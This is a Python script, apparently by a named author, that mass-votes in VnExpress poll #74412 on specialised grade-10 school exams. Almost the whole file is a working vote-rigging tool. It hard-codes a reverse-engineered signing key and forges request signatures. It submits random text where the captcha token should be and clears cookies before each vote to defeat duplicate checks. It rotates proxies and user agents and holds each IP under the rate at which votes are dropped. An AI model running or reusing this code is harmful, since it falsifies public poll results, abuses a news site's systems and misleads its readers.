# ==============================================================================
# 🚀 AUTO VOTE VNEXPRESS #74412 - THI LỚP 10 CHUYÊN THEO KHỐI
# Author : _LeMinhVoid_VnxD
# Profile: https://printpf.netlify.app/
#
# V5 PURE HTTP ENGINE — SIÊU MẠNH, KHÔNG CẦN BROWSER, KHÔNG CAPTCHA
# ------------------------------------------------------------------------------
#  Đã dịch ngược và tái tạo 100% giao thức của VnExpress:
#    1) GET  /api/cf        -> {t, _t}   (lấy theo từng session, dùng 1 lần)
#    2) POST /vote/insertvote
#        payload = siteid, questionid, answerid, text, deviceenv, inter_type,
#                  version, format, cTime, cNonce, cKey, sTime, _csrf
#        sign    = md5( nối "key+value" của payload flatten, sort theo key )
#        KHÔNG cần captcha thật — server không xác thực trường "text"!
#    3) Server chống trùng bằng cookie phiên -> mỗi phiếu xoá cookie là xong
#
#  Thực đo (quan trọng):
#    - Server trả error=0 nhưng ÂM THẦM BỎ phiếu nếu gửi > ~5 phiếu/s/IP
#    - Ở 4.5 phiếu/s: đếm thật ~98-100% (~16.000 phiếu/giờ/IP)
#    - captcha token giả ("xxx...") vẫn được chấp nhận -> không cần browser
#    - Muốn nhanh hơn: nhiều IP (proxy/WARP), mỗi IP giữ <= 5 phiếu/s
# ==============================================================================

import argparse, concurrent.futures, datetime, hashlib, json, os, random, string, sys, threading, time, urllib.request
import requests

API = "https://usi-saas.vnexpress.net"
URL = "https://vnexpress.net/component/vote/value/74412"
CKEY = "yW]XcY6/T%db7})zfa4&wA"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

ANSWERS = {
    "dky": {"id": 249016, "name": "Đồng ý"},
    "kdy": {"id": 249017, "name": "Không đồng ý"},
}
POLL_ID = 74412

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

stats = {"done": 0, "succ": 0, "fail": 0, "retries": 0, "lock": threading.Lock()}
stop_event = threading.Event()
start_t = time.time()
baseline = {}
target_id = 0
target_name = ""


def log(msg):
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def fetch_live():
    try:
        url = f"{API}/vote/index?siteid=1000000&objectid={POLL_ID}&format=json&_={int(time.time()*1000)}"
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENTS[0], "Referer": "https://vnexpress.net/", "Cache-Control": "no-cache"})
        with urllib.request.urlopen(req, timeout=5) as r:
            d = json.loads(r.read().decode("utf-8"))
        item = d["data"][0]
        return int(item["total_initial"]), {a["_id"]: a["initial"] for a in item["answer"]}, item["title"]
    except Exception:
        return 0, {}, "?"


def flatten(d, prefix=""):
    out = {}
    for k, v in d.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, list):
            for i, item in enumerate(v):
                if isinstance(item, (dict, list)):
                    out.update(flatten(item, f"{key}[{i}]"))
                else:
                    out[f"{key}[{i}]"] = item
        elif isinstance(v, dict):
            out.update(flatten(v, key))
        else:
            out[key] = v
    return out


def make_payload(aid, cf):
    p = {
        "siteid": "1000000", "questionid": POLL_ID, "answerid": aid,
        "text": "".join(random.choices(string.ascii_letters + string.digits + "-_", k=random.randint(200, 400))),
        "deviceenv": 4, "inter_type": "v4", "version": 3, "format": "json",
        "cTime": int(time.time() * 1000),
        "cNonce": "".join(random.choices(string.ascii_letters + string.digits, k=16)),
        "cKey": CKEY,
        "sTime": cf["t"], "_csrf": cf["_t"],
    }
    flat = flatten(p)
    p["sign"] = hashlib.md5("".join(f"{k}{flat[k]}" for k in sorted(flat)).encode()).hexdigest()
    p.pop("cKey")
    return p


class RateGuard:
    """429 ở bất kỳ luồng nào -> tạm dừng toàn cụm vài giây (không bị khoá IP)."""

    def __init__(self):
        self._until = 0.0
        self._lock = threading.Lock()

    def wait(self):
        while not stop_event.is_set():
            with self._lock:
                delta = self._until - time.time()
            if delta <= 0:
                return
            time.sleep(min(delta, 0.5))

    def hit(self, secs):
        with self._lock:
            self._until = max(self._until, time.time() + secs)


class Pacer:
    """Token bucket: giữ tốc độ gửi trung bình <= rate phiếu/s.

    Quan trọng: server VnExpress trả error=0 nhưng ÂM THẦM BỎ phiếu nếu gửi
    quá nhanh (~>5 phiếu/s/IP). ~4.5/s là ngưỡng an toàn đã kiểm chứng.
    """

    def __init__(self, rate):
        self.interval = 1.0 / max(0.1, rate)
        self.next = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        while not stop_event.is_set():
            with self.lock:
                now = time.time()
                if now >= self.next:
                    self.next = now + self.interval * random.uniform(0.85, 1.15)
                    return
                wait = self.next - now
            time.sleep(min(wait, 0.3))


_tls = threading.local()


def new_session(proxy=None):
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": URL,
        "Origin": "https://vnexpress.net",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
    })
    ad = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=8, max_retries=0)
    s.mount("https://", ad)
    s.mount("http://", ad)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def vote_once(s, guard, aid):
    """1 phiếu = GET /api/cf + POST /vote/insertvote. Trả SUCCESS / 429 / FAIL."""
    for _ in range(3):
        if stop_event.is_set():
            return "FAIL"
        guard.wait()
        try:
            s.cookies.clear()  # né dedupe "Bạn đã bình chọn"
            cf = s.get(f"{API}/api/cf", timeout=6).json()
            if "t" not in cf:
                time.sleep(0.1 + random.random() * 0.2)
                continue
            r = s.post(f"{API}/vote/insertvote", data=make_payload(aid, cf), timeout=6,
                       headers={"referer-path": "/component/vote/value/74412"})
            if r.status_code == 429:
                guard.hit(random.uniform(2.0, 4.0))
                return "429"
            try:
                j = r.json()
            except Exception:
                time.sleep(0.1 + random.random() * 0.2)
                continue
            if j.get("error") == 0:
                return "SUCCESS"
            time.sleep(0.1 + random.random() * 0.3)
        except Exception:
            time.sleep(0.15 + random.random() * 0.35)
    return "FAIL"


def load_proxies(path):
    if not path or not os.path.exists(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8-sig", errors="ignore") as f:
        for line in f:
            line = line.strip().lstrip("\ufeff")
            if not line or line.startswith("#") or " " in line:
                continue
            if "://" not in line:
                line = "http://" + line
            try:
                from urllib.parse import urlparse
                u = urlparse(line)
                if not u.hostname or not u.port:
                    continue
            except Exception:
                continue
            out.append(line)
    return out


def report():
    with stats["lock"]:
        done, succ, fail, retries = stats["done"], stats["succ"], stats["fail"], stats["retries"]
    el = max(1, int(time.time() - start_t))
    spd = int(succ / el * 3600)
    _, now, _ = fetch_live()
    me = now.get(target_id, baseline.get(target_id, 0))
    others = {k: v for k, v in now.items() if k != target_id}
    rival = max(others.items(), key=lambda kv: kv[1]) if others else (0, 0)
    gap = rival[1] - me
    log(f"[+] Gửi: {done:,} | OK: {succ:,} | Fail: {fail:,} | 429: {retries:,} | "
        f"Live: {me:,} | Tốc: ~{spd:,} v/h | Gap đối thủ: {gap:+,}")


def main():
    global baseline, target_id, target_name

    parser = argparse.ArgumentParser(description="Auto vote VnExpress #74412 - V5 pure HTTP")
    parser.add_argument("--tabs", type=int, default=1500, help="tổng số phiếu")
    parser.add_argument("--parallel", type=int, default=16, help="số luồng (16 ~ tối ưu/IP)")
    parser.add_argument("--answer", default="dky", help="dky | kdy | ID số")
    parser.add_argument("--proxy-file", default=None, help="file proxy (mỗi dòng 1 proxy, có thể socks5://)")
    parser.add_argument("--rate", type=float, default=4.5,
                        help="tốc độ gửi tối đa mỗi IP (phiếu/s). >5 dễ bị server bỏ phiếu âm thầm")
    parser.add_argument("--delay", type=float, default=0.0, help="nghỉ thêm giây giữa các phiếu mỗi luồng")
    args = parser.parse_args()

    _, _, title = fetch_live()
    a = args.answer.strip().lower()
    if a.isdigit():
        target_id, target_name = int(a), f"Answer #{a}"
    elif a in ANSWERS:
        target_id, target_name = ANSWERS[a]["id"], ANSWERS[a]["name"]
    else:
        log(f"[!] Đáp án '{args.answer}' không hợp lệ. Chọn: dky / kdy / ID số.")
        sys.exit(1)

    baseline = fetch_live()[1]

    proxy_file = args.proxy_file or os.path.join(SCRIPT_DIR, "proxies.txt")
    proxies = load_proxies(proxy_file)

    log("=" * 72)
    log("  🚀 AUTO VOTE VNEXPRESS #74412 (V5 — PURE HTTP, NO CAPTCHA)")
    log("  Author : _LeMinhVoid_VnxD | https://printpf.netlify.app/")
    log("=" * 72)
    log(f"[*] Khảo sát : {title}")
    log(f"[*] Mục tiêu : {target_name} (ID: {target_id})")
    for aid, val in sorted(baseline.items(), key=lambda x: -x[1]):
        name = next((i["name"] for k, i in ANSWERS.items() if i["id"] == aid), f"Answer #{aid}")
        mark = "  <<== MỤC TIÊU" if aid == target_id else ""
        log(f"    >> {name:<22} : {val:,} phiếu{mark}")
    log(f"    >> Tổng biểu quyết                 : {sum(baseline.values()):,} phiếu")
    log(f"[*] Engine   : HTTP thuần, KHÔNG captcha | {args.parallel} luồng | {args.tabs:,} phiếu | "
        f"{len(proxies) if proxies else 1} IP")
    log(f"[*] Tốc độ   : {args.rate} phiếu/s/IP (~{int(args.rate*3600):,}/giờ, ngưỡng đếm an toàn)")
    log("=" * 72)

    guard = RateGuard()
    pacers = {}
    pace_lock = threading.Lock()

    def get_pacer(key):
        with pace_lock:
            if key not in pacers:
                pacers[key] = Pacer(args.rate)
            return pacers[key]

    reserved = {"n": 0, "lock": threading.Lock()}

    def worker(wid):
        proxy = proxies[wid % len(proxies)] if proxies else None
        pacer = get_pacer(proxy or "direct")
        s = new_session(proxy)
        my_fail = 0
        while not stop_event.is_set():
            with reserved["lock"]:
                if reserved["n"] >= args.tabs:
                    return
                reserved["n"] += 1

            pacer.acquire()
            r = vote_once(s, guard, target_id)
            with stats["lock"]:
                stats["done"] += 1
                if r == "SUCCESS":
                    stats["succ"] += 1
                elif r == "429":
                    stats["retries"] += 1
                else:
                    stats["fail"] += 1

            if r == "FAIL":
                my_fail += 1
                if proxy and my_fail >= 5:   # proxy chết -> chuyển proxy kế tiếp
                    my_fail = 0
                    try:
                        s.close()
                    except Exception:
                        pass
                    proxy = proxies[(wid + random.randint(1, 997)) % len(proxies)]
                    s = new_session(proxy)
                    log(f"[W{wid}] Đổi proxy -> {proxy.split('@')[-1]}")
            else:
                my_fail = 0

            if args.delay > 0:
                time.sleep(args.delay * random.uniform(0.6, 1.4))

    stop_reporter = threading.Event()

    def reporter():
        last = -1
        while not stop_reporter.wait(10):
            with stats["lock"]:
                d = stats["done"]
            if d != last:
                last = d
                report()

    threading.Thread(target=reporter, daemon=True).start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.parallel) as ex:
        futs = [ex.submit(worker, i) for i in range(args.parallel)]
        try:
            for i, f in enumerate(futs):
                try:
                    f.result()
                except Exception as e:
                    log(f"[!] Worker #{i} lỗi: {type(e).__name__}: {e}")
        except KeyboardInterrupt:
            log("[!] Ctrl+C — dừng...")
            stop_event.set()
            concurrent.futures.wait(futs, timeout=15)

    stop_reporter.set()
    el = max(1, int(time.time() - start_t))
    _, ans_a, _ = fetch_live()
    gain = ans_a.get(target_id, 0) - baseline.get(target_id, 0)

    log("=" * 72)
    log(f"[OK] HOÀN TẤT: {stats['succ']:,}/{args.tabs:,} phiếu OK trong {el}s "
        f"({int(stats['succ']/el*3600):,} v/h) | Fail: {stats['fail']:,} | 429: {stats['retries']:,}")
    log(f"[*] VnExpress ghi nhận tăng thêm: +{gain:,} phiếu")
    log(f"[*] Tổng hiện tại của mục tiêu  : {ans_a.get(target_id, 0):,} phiếu")
    log("=" * 72)


if __name__ == "__main__":
    main()
